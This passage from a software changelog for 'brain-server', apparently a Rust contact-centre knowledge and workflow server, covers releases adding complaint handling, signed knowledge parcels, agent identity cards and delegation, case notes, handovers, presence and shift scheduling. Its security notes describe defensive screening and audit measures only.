# Changelog — brain-server

All notable changes are documented here. The format is a simplified keep-a-changelog
style. Version numbers follow `Cargo.toml`; "released" means the binary and docs
are consistent at that tag.

Release-notes convention (v1.21.0+): every section splits into `### Release
notes` (written for USERS — **Bug fixes** / **Improvements** /
**Security fixes**, marked "None" when a category is empty) followed by
`### Engineering record` (the milestone detail, validation counts, honest
ceilings). The release workflow publishes ONLY the `### Release notes` block
as the GitHub release body (older sections fall back to the intro paragraph)
and strips internal references (implementation plans, agent history) before
publishing.

Honesty note: retrieval-quality claims below describe *what the code does*, not
measured parity against external engines (e.g. QMD). Where a benchmark has not
been run, it is marked **pending** rather than asserted.

---

## [1.28.31] — 2026-08-26 — "Charter": the conformance pack lands

The contact-center conformance pack closes gaps G1–G10 in one release:
complaints become a first-class case class (ISO 10002), metrics become a
dictionary with data lineage (COPC/KPI canon), accessibility becomes a
release-blocking gate with a shipped ACR/VPAT (WCAG 2.2 AA / EN 301 549),
global-locale readiness ships (`ar` RTL + `en-XA` pseudolocale), the WFM
interop boundary completes (`GET /ops/skills`), and the compliance/deployment
docs gain the clause maps, workload ceiling, and T1–T4 tier guide.
Self-assessed posture throughout — no certification is claimed.

### Release notes

- **Improvements:** Complaints are a first-class case class, not an escalation flavor — the intake classifier gains `Complaint`; complaints carry their own envelope: acknowledgment within the hour by policy, always tighter than the 72h response clock, P2-minimum priority map; escalation-to-dispute is a documented handover audited as `handover/dispute` — the complaints register IS the audit chain, zero new tables.
- **Improvements:** every scoreboard field now has a normative entry in [docs/metrics.md](docs/metrics.md) (formula, source lineage, window semantics, industry citation), pinned by a docs↔code parity meta-test; the FCR repeat-attribution window is configurable via `BRAIN_FCR_WINDOW_DAYS` (default 7) and consumed by the scoreboard derivation.
- **Improvements:** accessibility is a release-blocking gate — WCAG 2.2 AA checklist-enforced for the client, with an Accessibility Conformance Report at [docs/trust/acr-vpat.md](docs/trust/acr-vpat.md) for web + desktop (EN 301 549 clause-11 mapping), honestly listing the known ceilings.
- **Improvements:** global-locale readiness — `ar` (right-to-left, full string parity) and the `en-XA` pseudolocale join the shipped locale set under the existing key-parity wall; the UI mirrors when an RTL locale is active.
- **Improvements:** the WFM seam is complete — `GET /ops/skills` joins the shifts feed as the documented interop boundary; centers keep their workforce-management tool, brain keeps governed truth (no forecasting engine built).
- **Improvements:** contact-center standards posture documented end to end — COPC R8.0 + ISO 18295-1 clause maps in COMPLIANCE.md §6.7, deployment tiers T1–T4 in docs/deployment.md, PCI DSS explicit non-scope in THREAT_MODEL §6, and test-pinned watch items so standards revisions cannot land silently.
- **Bug fixes:** the OpenAPI scoreboard response schema caught up to the wire shape (five fields shipped in earlier releases were missing from the contract).

### Engineering record

- G1: `IntentClass::Complaint` + `stamp_complaint_envelope`
  (`COMPLAINT_ACK_SECS`/`COMPLAINT_RESPONSE_SECS`) in the SDK policy module;
  `Envelope` gains additive `ack_deadline` (non-complaint stamps keep one
  clock); `relay::record_dispute_escalation` reuses the offer machinery with
  audit detail `handover/dispute`. Tests: bin **891** / 6 ignored (**+8**
  over v1.28.30: plan-named pins `complaint_class_gets_acknowledgment_sla`,
  `complaint_escalation_is_audited_as_dispute`, plus SDK
  `complaint_envelope_ack_leads_response`), lib **194** / 1 unchanged.
- G2: `config::fcr_window_days()`; derivation consumes the window via an
  optional recorded recurrence age; tests `fcr_window_is_configurable_and_
  deterministic` (shared-lock env posture) +
  `scoreboard_fields_have_dictionary_entries` (two-way docs↔code parity).
- G3: client `a11y` test module parses docs/trust/wcag22-aa-checklist.md
  (PASS/CEILING verdicts only; CEILING must cite the ACR) +
  `acr_lists_known_ceilings_honestly`.
- G4: `SUPPORTED_LOCALES` 5 → 7; `dir_for_locale` extracted pure (the shell
  effect consumes it); client suite **232 passed** (+3).
- G5: `workflow::crew::list_skills` (bounded 1000-row ordered read) + handler
  `get_ops_skills` (Read on domain, strip-seam on emitted principals);
  route + openapi + docs/api.md + guard tables in the same change; test
  `wfm_feed_round_trips_shifts_and_skills`.
- G10: new `src/docs_truth.rs` meta-tests pin the ISO watch item, the
  self-assessed posture wording, and the documented FCR default against code.
- Schema: **unchanged at 1.28.30** — zero tables/columns touched this
  release. fmt + clippy `-D warnings` clean; live smoke on a DB COPY green
  (`brain doctor` clean, `/audit/verify` ok:true, new route serving).

### Honest ceilings

- The complaint acknowledgment/response clocks are POLICY STAMPS on the
  envelope — no scheduler enforces them yet (the same posture as the DSAR
  window: a commitment shown, not an automatic bound). Escalation-to-dispute
  is invoked explicitly; complaints do not yet auto-route through it.
- The FCR window only bites where upstream runs record their recurrence age;
  runs without it fall back to the explicit `repeat_contact` flag exactly as
  before.
- The Arabic locale is a first cut (domain terms like DSAR/UMP kept Latin);
  the pseudolocale wraps rather than accents. The axe accessibility gate
  covers the web console only; desktop rests on manual walkthroughs
  (both ceilings stated in the ACR).
- Workload visibility remains measured-never-enforced by design; no
  forecasting/scheduling engines (WFM = interop); certification of nothing is
  claimed or planned.

---

## [1.28.30] — 2026-08-25 — "Parcels": sites share knowledge, governed

"Large domain brain per site, then site-to-site": Parcels ships the governed answer to islands of knowledge — signed, human-gated **knowledge parcels**, deliberately slower than live federation because every crossing of a site boundary is a reviewed act (federation itself stays v3.x). Export builds a bundle of a domain's *approved* knowledge only (promoted rows; quarantined `flagged` rows and other domains' data never leave) with provenance + residency stamps copied READ-ONLY, signed with the UMP operator key over the exact manifest bytes — no key refuses loudly. Import verifies BEFORE any write (tampered/unsigned refuses with nothing written; an optional out-of-band `expected_signer` check refuses publisher mismatch), then lands every surviving row as a **PENDING proposal** in the target domain — never a direct knowledge write — deduplicated by content fingerprint against knowledge AND still-pending proposals, injection-screened rows refused and counted. A **parcel ledger** (direction in/out, hash, signer did, reviewer) records every crossing chained into the audit trail in the same transaction.

### Release notes

**Improvements**
- Signed site-to-site knowledge parcels: `POST /parcels/export` (Admin on domain), `POST /parcels/import` (Write; verify-first, import-as-proposals), `GET /parcels` (the bounded ledger view) — openapi.yaml + guard tables updated in the same change.
- New CLI surface: `brain parcel export --domain <d> [--since <ts>] --out <file>`, `brain parcel import --file <file> --domain <d> [--expected-signer <did>]`, `brain parcel ledger [--domain <d>]` — all through the server's governed paths.
- Schema 1.28.29 → **1.28.30** (additive `parcel_ledger` table per domain DB).

**Security fixes**
- Import is fail-closed end to end: signature verification precedes any write; row content hashes are re-bound to actual content so edited content cannot sneak past dedup; write-time injection screening refuses flagged rows before they reach the review queue.

**Bug fixes**
- None.

### Engineering record

- Pure core `src/workflow/parcels.rs` (`&Connection`, caller's tx): `build_parcel` / `record_export` / `import_parcel` / `list_ledger`; handler adapters in `src/handlers/parcels.rs`. Ledger writes chain via `record_tenant` (SAVEPOINT-nested) inside the caller's transaction. Content screening reuses the two-layer `screen` at import; dedup rides the xxh3-64 content-fingerprint convention and the existing UNIQUE-index law.
- Tests: bin **883** / 6 ignored (+4 plan-named pins: `parcel_export_contains_only_approved_rows_with_region_stamps`, `import_creates_proposals_never_direct_writes`, `content_hash_dedup_across_parcels`, `parcel_ledger_chains_into_audit`); lib **194** / 1 ignored. fmt + clippy `-D warnings` clean. Schema-contract test extended (`parcel_ledger`); route-coverage + route-authz guard tables extended; live smoke on a DB COPY green.
- Zero new dependencies (ed25519-dalek, sha2, hex, bs58, xxhash-rust already declared).

### Honest ceilings

- The `proposals` table predates domains: imported rows are GLOBAL pending proposals until approval, distinguishable by their `parcel:{domain}:{signer}` source label only — no per-domain review queue yet. Planned as **v1.28.53 "Triage"** (additive `proposals.domain`/`title`, per-domain scoping, gate-core extraction).
- Signing uses the UMP Ed25519 operator key (the Mesh convention), NOT minisign — there is no Rust minisign, and shelling out would add an untestable external runtime dependency. Publisher identity at import rests on the optional `expected_signer` check + the ledger record; without it, a self-consistent forged parcel can land as PENDING proposals only (nothing reaches knowledge without human approval).
- No encryption-at-rest on the parcel bundle yet (backup v3 AES-GCM/Argon2 exists as the seam); no gold-set sync on the envelope (frozen packs stay crate-owned); no client/plugin surface — API + CLI first.
- The 500-row export cap refuses loudly instead of paging; narrow the `since` cursor.

---

## [1.28.29] — 2026-08-25 — "Mesh": agents as named colleagues

Within one deployment, "each agent has a brain db, collaborating" means agents get IDENTITY, capability discovery, and delegation — the A2A protocol's shape without its network layer (live federation stays v3.x territory). Mesh ships three governed primitives: **Agent Cards** (the A2A-standard JSON manifest per agent principal, Ed25519-signed with the UMP operator key at provisioning and RE-VERIFIED at every use point — a card whose signature no longer matches refuses loudly), **delegation** (agent→agent work orders as lineage events on a run: the request names the target's VERIFIED card first — an unknown or tampered card refuses with nothing written; results return delegatee-only, exactly once by CAS), and the **working-set arbiter** (a pure mapping from base domain + agent to the agent's own scratch-domain name; promotion into shared domains stays behind the existing HITL proposal gate).

**M1 (storage + pure core):** two additive tables in every domain DB (schema → **1.28.29**, schema-contract test extended): `agent_cards` (UNIQUE(domain, principal); stores the exact signed manifest bytes + hex signature + signer `did:key`) and `delegations` (run FK, screened task/result content, `requested → completed` CAS state). The pure core (`src/workflow/mesh.rs`) holds card provisioning/verification (sign sha256(manifest) at write, strict verification at every read and at delegation acceptance — fail-closed on tampered bytes OR missing operator key), the per-run delegation ceiling (`409 delegations_full`, evidence refused never dropped), and the working-set domain derivation (charset-legal, collision-safe via content hash). Task/result CONTENT lives in the table; lineage payloads on `delegation/request` / `delegation/result` carry ids + actors only — the Channel law, so work-order text cannot ride the engine-facing event bus.

**M2 (surfaces):** `POST /ops/agents/cards` provisions/re-signs (Admin on the domain; `409 operator_key_missing` without a key). `GET /ops/agents/cards?domain=` serves only verified cards — one tampered row fails the whole list closed. `POST /workflow/runs/{id}/delegations {to_principal, task}` verifies the target's card BEFORE any write (`400 agent_unknown` / `card_tampered`), screens the task through the SAME one-function screen as notes, and commits row + lineage event + audit in ONE WorkflowTx. `GET .../delegations` is the bounded run view; `POST .../{delegation_id}/result {result}` is delegatee-only (`400 not_delegatee`), exactly-once (`409 result_already_submitted` on replay). Crew presence rides mutating mesh txs best-effort.

**M3 (wiring):** five routes registered with openapi.yaml (wire-exact bodies), docs/api.md, the route-coverage guard array, the route-authz guard table (+ the mesh handler source mapping).

### Release notes

- **Improvements:** agents become named colleagues — each agent principal carries a standards-shaped (A2A) identity card, signed by the operator key and re-verified whenever it is used.
- **Improvements:** agent-to-agent delegation inside a governed run: request a named verified agent's work on the case's lineage, and its result returns through the same audited chain, exactly once, from the delegatee only.
- **Security fixes:** delegation targets must verify against the operator key before anything is written; tampered or rotated-away cards refuse loudly everywhere they surface; task/result text is screened at write (bounds + prompt-injection blocklist + invisible-strip) and never enters lineage payloads; per-run delegation ceiling; every mutation audits beside its lineage event in one transaction; every emitted string rides the read seam.
### Engineering record
- Tests: server main bin **883** / 6 ignored (**+4** over v1.28.28: the plan-named pins `agent_card_signature_verified_on_principal_use`, `delegation_request_and_result_are_lineage_events`, `agent_working_set_isolated_until_promoted`, `cross_agent_recall_shows_origin_labels`), lib **194** / 1; clippy `-D warnings` + fmt clean. Schema 1.28.28 → **1.28.29** (additive `agent_cards` + `delegations`). Zero new dependencies (ed25519-dalek, sha2, hex already declared).

### Honest ceilings
- Delegation RESULTS ride the lineage like steering (screened, bounded, in-table) — promotion into evidence rows / shared knowledge stays the HITL proposal path; no auto-ingest of agent output ships here.
- The working-set arbiter pins the NAMESPACE vocabulary; no surface yet filters reads by it end-to-end (per-agent scratch isolation is enforced today by domain scoping + owner columns, not by the derived name).
- Card verification trusts the CURRENT operator key: a key rotation invalidates every existing card until re-provisioned (fail-closed by design, but operationally loud).
- No client/plugin surface — Mesh is API-first; Cockpit agent-card badges are a later client release.
- Cross-agent recall provenance remains the existing `origin='agent'` label through the read seam (pinned); agents still see each other's approved knowledge exactly as any same-domain reader does.

---




## [1.28.28] — 2026-08-25 — "Channel": the case gets a room

Swarming means pulling the expert INTO the case, not transferring the case to the expert — and until now there was no way for humans to speak inside one. Channel ships the case-scoped room: notes are rows in a new `case_notes` table AND lineage events on the new `case/note` outbox topic — the human-facing counterpart of steering (the agent-facing channel), both events on the same lineage. Loud non-goal, stated in the module docs: this is NOT chat infrastructure — no DMs, no channels without a run; everything is case-scoped, screened at write, retained per domain policy, swept by DSAR, and audited per mutation.

**M1 (storage + pure core):** additive `case_notes` table in every domain DB (schema → **1.28.28**, guarded by the schema-contract test; indexed `(run_id, id)`). One row per note (`kind='note'`) and one per swarm invite (`kind='invite'`, `addressed_to` = the invited principal, `parent_note_id` → the mentioning note). The write-time screen lives in ONE function (`channel::screen_content`): trim-empty refuses, the 4000-char bound holds, the prompt-injection blocklist runs once here, and the STORED form passes invisible-strip + markdown-ref strip — a planted bidi marker or remote image ref cannot ride a note into any downstream renderer (PII redaction deliberately stays a READ decision — the stored form is viewer-independent, the ReviewArmour digest law). Note CONTENT never rides the lineage payload: `case/note` events carry ids and actors only, so the engine-facing `/events` read serves attribution without leaking the conversation.

**M2 (mentions → swarm invites):** `@skill:<tag>` resolves against `principal_skills`; a bare `@<principal>` against the domain's presence roster (anyone this domain has seen act — fail-closed: an unknown name cannot be invited). Dead mentions refuse BEFORE any write with `400 mentions_unresolved` carrying the list (the Relay missing-list coaching posture); the swarm cap refuses > 16 resolved invitees (`400 invite_limit`) so a mention storm cannot become a mass-notification amplifier; self-mentions skip silently (you are already in the room). Each resolved principal gets an invite row + a `case/note` event whose drain to `/events` IS the Crew ping — the SSE drain family widened from `workflow/%` to include `case/%` (steering/intake stay engine-only). Acceptance reuses Relay's machinery, smaller: `POST .../notes/{invite_id}/accept` CASes `pending → accepted` in ONE transaction with its lineage event + audit; replaying a decided invite returns `{moved:false}`; ownership never moves.

**M3 (retention + erasure reach):** the channel view (`GET /workflow/runs/{id}/notes`) hides policy-expired notes at read time BEFORE the page split under the `case-note` retention kind — the SAME three-layer resolution as the decay path (kill-switch off = nothing decays; a bound profile's block replaces the server-wide map), resolved inside the read's blocking task via the single-domain `profile_for_domain` lookup. The DSAR sweep now erases `case_notes` twice over: run-dependent rows die with their run, and subject-authored/addressed rows go by exact principal on ANY run (over-match, erasure-safe direction; counted honestly as `channel_rows`). **The sweep also clears every other FK child of a deleted run** — `handover_offers` (FK enforcement made sweeping any run holding offers FAIL the whole erasure) and `crm_cases` links UNLINK (`run_id` → NULL; the external CRM case outlives its erased run, only this server's link row lets go). Both latent gaps were caught by the Channel pin.

### Release notes

- **Improvements:** the case gets a room — humans post screened, bounded notes inside a governed run, and the machine turns `@skill:` / `@principal` mentions into swarm invites the invitee accepts into the channel (same accept discipline as Relay).
- **Improvements:** invite pings flow over the existing `/events` SSE feed alongside workflow lineage — no new transport, no background worker beyond the existing drainer tick.
- **Security fixes:** note content is screened at write exactly like steering (bounds + prompt-injection blocklist + invisible-strip + markdown-ref neutralization) and stored viewer-independent; dead mentions refuse loudly instead of silently inviting nobody; mention storms are capped; expired notes disappear from reads per domain policy; DSAR erasure reaches notes authored by OR addressed to the subject on any run; every mutation audits in its own transaction beside its lineage event; every emitted string rides the read seam.
### Engineering record
- Tests: server main bin **875** / 6 ignored (**+11** over v1.28.27: the four plan-named pins `notes_are_screened_and_case_scoped_only`, `mention_resolves_skill_to_principals`, `invite_accept_joins_channel_and_audits`, `notes_honour_retention_and_dsar_sweep`, plus `mention_storm_refuses_over_the_cap`, the erasure pin `dsar_sweep_erases_channel_rows_and_fk_children_of_the_run` (offers + notes + the CRM-link unlink against one run), the SSE-drain pin `channel_notes_drain_to_the_sse_bus`, and the four third-pass hardening pins `oversized_mention_tokens_report_dead_not_skipped`, `insert_note_validates_invitee_identity_before_any_write`, `channel_full_refuses_at_the_ceiling`, `note_content_never_rides_lineage_payloads`), lib **194** / 1; brain 19, mcp 37, eval 4, metrics 8 unchanged; clippy `-D warnings` + fmt clean; lipstyk diff-strict clean. Schema 1.28.27 → **1.28.28** (additive `case_notes`). Second-pass hardening: the POST receipt echoes the STORED row's clock (one read per request — previously a second `Utc::now()` could drift from the persisted `created_at`), retention resolution moved off the async reactor into the read's blocking task, the lineage-append tip-read deduped into one shared `outbox::append_lineage` (Relay + Channel call the same function), and the invite-limit wire message derives from the constant instead of a duplicated literal. Live smoke on a DB COPY of the live DB green end-to-end (`/audit/verify` ok; receipt timestamp byte-matches the stored row).

**Hardening pass (third, pre-release — OWASP LLM Top-10 v2025 + 2025–26 agent-memory-poisoning literature; full report in `AUDIT.md` §2026-08-25):** H1 the per-run channel ceiling (`MAX_NOTES_PER_RUN = 1000`, notes and invites sharing one budget) refuses further posts with `409 channel_full` BEFORE any write — OWASP LLM10 unbounded consumption closed, and REFUSED rather than steering's drop-oldest because case rooms are evidence; H2 over-vocabulary mention tokens (>32-char skill tag, >256-char name) now resolve as DEAD and surface in `details.unresolved` instead of being silently skipped — a mention the author believes fired but didn't is exactly the failure this surface refuses to hide; H3 invitee identity validation moved INSIDE `insert_note` (the fence holds of the FUNCTION — no future caller can bypass resolution and store an invisible-char id); H4 DSAR symmetry: the export bundle carries `channel_notes[]` selected by the SAME three arms the purge erases (author / addressee / content-LIKE), and the sweep gained the content arm — Art 15 disclosure and Art 17 erasure now match exactly. Structural verification: note CONTENT never rides any lineage payload (ids + actors only — pinned), so the AgentPoison/MINJA poison-sink class cannot reach the engine-facing event bus; mention resolution is byte-exact against server-side tables (no confusable spoofing); zero interpolated SQL in every new path.

### Honest ceilings
- Retention is read-time enforcement over stored rows: expired notes are HIDDEN from reads, never deleted by any worker (the repo's no-background-worker law) — physical deletion rides run-level erasure (DSAR) only. No built-in default TTL ships for `case-note`: operators opt in via `BRAIN_RETENTION_KIND_DAYS` or a bound profile block; absent policy = notes persist with their run. `/retention/report` does not yet include a `case-note` row (it iterates knowledge kinds only).
- Invite acceptance does not verify the acceptor IS the addressed principal — any Write-capable principal may accept on the invitee's behalf, mirroring the documented Relay delegation posture.
- The SSE drain publishes note payloads with the same single-sanitize posture as workflow events (sanitized once at drain time, per-subscriber run-domain Read gate on the envelope; PII redaction per subscriber is impossible on a shared broadcast). The write-time screen is the guarantee; note content additionally never enters the drained payload at all.
- `@principal` resolution requires presence (the roster of principals who have acted in the domain) — an expert who has never touched the deployment cannot be invited by NAME until they appear (skills-tagged experts resolve regardless).
- The channel view filters from a newest-2000 superset before paging; fine on loopback SQLite.
- DSAR dry-run footprint does not count channel rows (live purge does) — the same understatement the Crew sweep documents.
- No client/plugin surface yet — Channel is API-first like Relay/Crew; the Cockpit note-node render (author badges from Crew presence) is a later client release.

---



## [1.28.27] — 2026-08-25 — "Relay": the one-click handover

The follow-the-sun research is unanimous: structured packets, explicit acceptance, overlap windows, ownership rules — "hot potato" is what happens when none of those exist. Lineage already assembles the I-PASS handoff packet; nothing offered or accepted it. Relay wires that packet into a governed flow: an OFFER refuses unless the packet is complete (the refusal carries the MISSING list — the machine coaches the protocol, the human fixes the packet); ACCEPT transfers ownership by CAS without touching the SLA clock and points at the resume-at checkpoint; DECLINE requires a screened reason (an audited refusal beats a silent bounce).

**M1 (storage + pure core):** new additive `handover_offers` table in every domain DB (schema → **1.28.27**, guarded by the schema-contract test; indexed `(run_id, state)`). The pure core (`src/workflow/relay.rs`) holds the five packet-completeness predicates (`packet_missing`: open question? un-breached SLA? current step? linked evidence/checkpoint? escalation resolved?), the offer insert (idempotent by open-state key so a retried POST cannot double-offer), and the accept/decline decision (decline WITHOUT a reason refuses before any write). Offer/accept/decline are lineage events on the `workflow/handover` topic (parent-linked outbox rows, chain-verified) with their audit rows written in the SAME transaction as their state move.

**M2 (the surfaces):** `POST /workflow/runs/{id}/handover/offer {to_principal, overlap_minutes?}` runs the completeness gate BEFORE any write — `400 packet_incomplete` carries `details.missing` and stores nothing. `POST .../{offer_id}/accept` performs the owner CAS-transfer inside the SAME WorkflowTx as the offer state move (either both land or neither does), replies `{owner, resume_at_checkpoint}`, and never mutates `sla_deadline`; deciding a decided offer replays `{moved:false}` instead of double-applying. `POST .../{offer_id}/decline {reason}` screens the reason through the read seam and bounds it at 4000 chars. `GET /ops/handovers?domain=&now=` is the follow-the-sun board: active runs ranked by SLA remaining (recorded deadline wins, else P3-from-created at run-open time), flagged while `now` sits inside the ring boundary's derived overlap window — pure read-time arithmetic over Watchbill shifts, no scheduler daemon. Crew presence rides every mutating handover tx (best-effort, never gates the work).

**M3 (wiring):** routes registered with openapi.yaml (four paths, wire-exact bodies), docs/api.md, the route-coverage guard array, the route-authz guard table (+ handler source mapping: offer/accept/decline are Writes on the run's domain with the `workflow` role gate; the board is a Read).

### Release notes

- **Improvements:** the one-click handover — offer/accept/decline over the I-PASS packet the Lineage release already builds, with the machine refusing incomplete packets and naming exactly what is missing.
- **Improvements:** ownership transfer by CAS in one transaction with the acceptance receipt; the SLA clock survives the handover by construction.
- **Improvements:** the handover-due board ranks active runs by SLA remaining and flags the overlap window at each ring boundary (Watchbill integration).
- **Security fixes:** declines require a screened reason ≤ 4000 chars; every offer/decision is audited in its own transaction alongside the lineage event; retried offers are idempotent; self-handovers and unbounded principals refuse at the gate; addressee ids carrying control/invisible characters refuse (fail-closed identity); acceptance never resurrects a finished run; every emitted text field rides the read seam.
### Engineering record
- Tests: server main bin **864** / 6 ignored (**+8**: the plan-named pins `offer_refuses_incomplete_packet_with_missing_list`, `accept_transfers_owner_without_sla_reset`, `handover_board_ranks_by_sla_remaining_at_boundary`, `offer_accept_decline_are_lineage_events_audited_once`, plus the hardening pass pins `board_skips_corrupt_state_loudly_never_silently`, `validate_to_principal_refuses_invisible_and_control_ids`, `ensure_run_active_refuses_finished_runs_offer_and_accept`, `decline_reason_validation_bounds_hold`), lib **194** / 1; clippy `-D warnings` + fmt clean. Schema 1.28.26 → **1.28.27** (additive `handover_offers`). Live smoke on a DB COPY of the live DB: migration stamps 1.28.27, doctor clean, `/audit/verify` ok after the full flow — incomplete-packet refusal WITH missing list → packet completed → offer accepted → idempotent re-offer returns the same id → accept transfers owner (SLA byte-identical) + resume checkpoint → decline without reason refused → decline with reason stored + audited → board ranked soonest-first; second live smoke (hardening pass): zero-width addressee refused 400, accept on a completed run refused 409 with no resurrection, whitespace-only decline reason 400, corrupt-state board row skipped AND counted on the wire, chain verify ok.
**Hardening pass:** the decline-with-empty-reason mis-map (`404` via the storage backstop) now refuses `400 reason_required` at the gate; acceptance reads the run's CURRENT status and refuses finished runs (`409 run_not_active`) instead of silently resurrecting them to active (the CAS now carries the true status); `to_principal` fails closed on control/invisible characters (a stripped id could collide with a different real principal at accept time); the board skips a corrupt-`state_json` run LOUDLY — warn log plus `corrupt_state_rows_skipped` on the wire, never a silent P3-fallback distortion of the ranking; every emitted text field (resume checkpoint, echoed addressee, board owner labels) rides the read seam.

### Honest ceilings
- Packet completeness is read off the STORED shape (`open_question`, `checkpoint`, `current_step` keys + a `workflow_steps` row exists check) — a run can carry a complete-looking packet that is substantively empty; the gate enforces the protocol's form, not its quality.
- Acceptance does not verify the acceptor IS the addressed `to_principal` — any principal holding Write on the domain may accept on their behalf (a deliberate delegation posture; tightening to addressee-only would strand cross-shift accepts when tokens rotate).
- The board caps at the newest 500 active runs and reads `state_json` per row (no index-served ranking); fine on loopback SQLite.
- `overlap_minutes` on an offer is recorded but not yet enforced against the ring's derived window (Watchbill supplies the window data; joining offer scheduling to it lands with Channel/Mesh).
- Decline reasons ride the read seam at write time only; the roster-style invisible-strip re-applies if they ever surface on a read view (none ships this release).
- No client/plugin surface yet — Relay is API-first; the Cockpit handover button is a later client release.

---



## [1.28.26] — 2026-08-25 — "Crew": colleagues become visible

Swarming and shared-queue models live or die on seeing the crew; until now the console showed cases and proposals, never people. Crew ships presence WITHOUT a background worker: presence piggybacks on authenticated activity, every upsert riding the caller's existing transaction — no heartbeat, and a rolled-back transition leaves no ghost. Reads compute TTL decay at read time (active < 5 min, away < 30 min, offline beyond); the roster merges the Watchbill shift ring (site badge), role badges (the JWT claim snapshot taken at last act), and HITL-maintained skills tags.

**M1 (presence):** new additive tables in every domain DB (schema → **1.28.26**, guarded by the schema-contract test): `presence` (one row per `(domain, principal)`, UPSERT refreshes ts/kind/ref/roles), `principal_skills`, and `crew_config`. The write seam is [`crew::touch`] — called inside the reviewer's own tx on every proposal decision ("reviewing") and inside the WorkflowTx of run open/event/answer/steering ("cranking", case ref `run:{id}`). Activity kinds are a closed vocabulary (`cranking|reviewing|idle`); unknown kinds refuse before any write.

**M2 (roster + privacy ceiling):** `GET /ops/crew?domain=&now=` (Read on the domain) serves the TTL-decayed roster — WHAT KIND of act plus an opaque `current_case_ref`, never case content; every emitted string passes the invisible-strip read seam (a planted zero-width/bidi principal id cannot smuggle a fence marker through the view), and an unknown stored activity kind degrades to `idle`. The DPO switch `POST /ops/crew/config` (Admin, audited) flips visibility per domain — **fail-open to HIDDEN**: an unreadable config row reads as disabled, never as more visibility than configured.

**M3 (skills, HITL-gated):** `POST /ops/skills` (Write) is the ONLY door toward tags and it never touches `principal_skills` directly — it creates one pending `crew_skills_update` proposal carrying `{domain, principal, add[], remove[]}` (the domain rides INSIDE the proposal so approval applies to exactly what was proposed). Approval runs the same validation again inside its IMMEDIATE transaction, CASes the proposal pending→approved, applies adds/removes idempotently (≤ 32 lowercase alnum-hyphen tags per principal), and audits `workflow/crew/skills` — replay refused, never double-applied.

**M4 (DSAR coverage — lifts the Watchbill ceiling):** the subject sweep now erases presence + skills rows by principal and REWRITES shift rosters to drop the subject (the shift survives — schedule evidence, not subject data); a corrupt roster cell fails the whole erasure rather than certifying a partial one. Counted honestly on the report as `crew_rows`.

**Hardening passes:** context7 doc verification against current rusqlite/axum guidance moved both new mutating handlers from raw `BEGIN IMMEDIATE` strings to RAII `transaction_with_behavior(Immediate)` — a panic mid-tx rolls back on drop instead of leaking an open transaction into the pool. Role snapshots are size-bounded at write (16 × 64 visible chars).

### Release notes

- **Improvements:** the crew roster — who is active/away/offline, on which site's shift, working which kind of task, with which skills; deterministic read-time arithmetic over activity rows, no scheduler daemon.
- **Improvements:** skills-based routing prerequisite — colleague skill tags maintained exclusively through human review (agents cannot self-tag).
- **Security fixes:** people-visibility is DPO-switchable per domain and fails to HIDDEN; roster output is invisible-character-stripped; skills changes are proposal-gated with in-tx CAS + audit; DSAR erasure now reaches presence, skills, and shift rosters (closing the roster gap left by the previous release).
### Engineering record
- Tests: server main bin **856** / 6 ignored (**+7**: the four plan-named pins `presence_upserts_ride_existing_transactions_no_worker` / `presence_decays_by_ttl_at_read` / `roster_never_exposes_case_content` / `skills_changes_are_proposal_gated`, plus cross-domain application, Watchbill site/skills join, and the DSAR crew sweep), lib **194** / 1; clippy `-D warnings` + fmt clean. Schema 1.28.25 → **1.28.26** (additive `presence` / `principal_skills` / `crew_config`). Live smoke on a DB copy: propose → digest-bound approve → tags land under the proposed domain → reviewer presence recorded by the approval itself → DPO-off hides everyone → DSAR purge scrubs all three people-tables → proposal replay refused → `/audit/verify` ok on every domain.

### Honest ceilings
- Presence reflects MUTATING authenticated acts only (workflow writes + review decisions); read-only surfaces do not bump it — an operator reading cases all day shows offline. Wiring reads would put a write on every GET; deliberately not done this release.
- `current_case_ref` is an opaque reference (`run:{id}`); resolving it back to case content still requires Read on the run's domain — but the roster alone does not re-authorize per-member, so a roster reader learns WHO works on run N without access to run N.
- Roster assembly is O(members) queries for skills (capped 500); fine on loopback SQLite, batchable later.
- DSAR dry-run footprint does not yet count crew rows (live purge does; the certificate understates the dry-run preview).
- Legal holds do not freeze crew rows (holds protect knowledge chunks/runs; people-metadata erasure proceeds).
- No retention/TTL for stale presence rows (they are one-per-principal upserts, so growth is bounded by principals, not by time); skills have no DELETE surface outside DSAR + explicit remove proposals.
- Skills-proposal approvals audit under the `global` tenant label while tags land under the proposed domain (all crew tables live in the single default pool file).

---



## [1.28.25] — 2026-08-24 — "Watchbill": shifts and the sun

Follow-the-sun is a *schedule* problem before it is a handover problem: the envelope SLA (P1–P4, ttl) exists but nothing knew when Site Manila ends and Site Amsterdam begins. Watchbill makes "queue follows the sun, cases don't" literal data — pure time-table arithmetic over stored shift rows, computed at read time; no scheduler daemon.

**M1 (the ring):** new `shifts` table in every domain DB (schema → **1.28.25**, additive + rollback-safe, guarded by the schema-contract test): one row per site's on-call window `(site, tz, start/end epoch, overlap_minutes, roster_json)`, indexed `(domain, start_epoch)`. The pure core (`src/workflow/shifts.rs`) derives everything at read: [`overlap_window`] computes each boundary's handover window from its shift pair (the incoming shift's first minutes up to the outgoing shift's end), and `ring_view` answers for any instant — which site owns the queue (`queue_scope_site` re-scopes to the INCOMING site at the START of the derived overlap window, not at the hard boundary), whether an overlap window is running, and when the next boundary lands. Open runs are never consulted or mutated — the plan-named pin `ring_boundary_rescopes_queue_not_cases` proves a run row survives byte-identical across a boundary.

**M2 (the surfaces):** `GET /ops/shifts?domain=&now=` (Read on the domain) serves the ring view plus the newest 500 shifts; `POST /ops/shifts` (**Admin** — declaring shifts is pure operator configuration; an agent-class principal must not re-anchor the follow-the-sun queue) stores one window with validation, insert, and the audit row riding ONE `BEGIN IMMEDIATE` transaction — a refused shift writes nothing. Refusals are loud and specific: `400 shift_window_invalid` / `shift_overlap_invalid` (overlap capped at 120 minutes) / `tz_invalid` / `roster_invalid` (≤ 64 ids × ≤ 256 chars — row-size bounds), `409 shift_double_booked` when a candidate starts before the earlier shift's final overlap period. Wired into openapi.yaml (GET+POST + `Shift` schema), docs/api.md, the route-coverage guard array, the route-authz guard table (+ handler source mapping).

**M3 (hardening passes 2–3):** the live smoke on a DB copy exposed the first double-booking rule as anchor-wrong — a shift starting mid-way through another was accepted as "declared overlap" because the budget anchored at the INCOMING start; the rule now anchors at the earlier shift's END (an overlapping pair may share only `e.end − e.overlap` onward, exactly where `overlap_window` derives the read-time boundary). Read cap added per the v1.20.18 "Bound" law (newest 500); input caps on tz/roster close the storage-amplification lever; POST gate tightened Write → Admin.

### Release notes

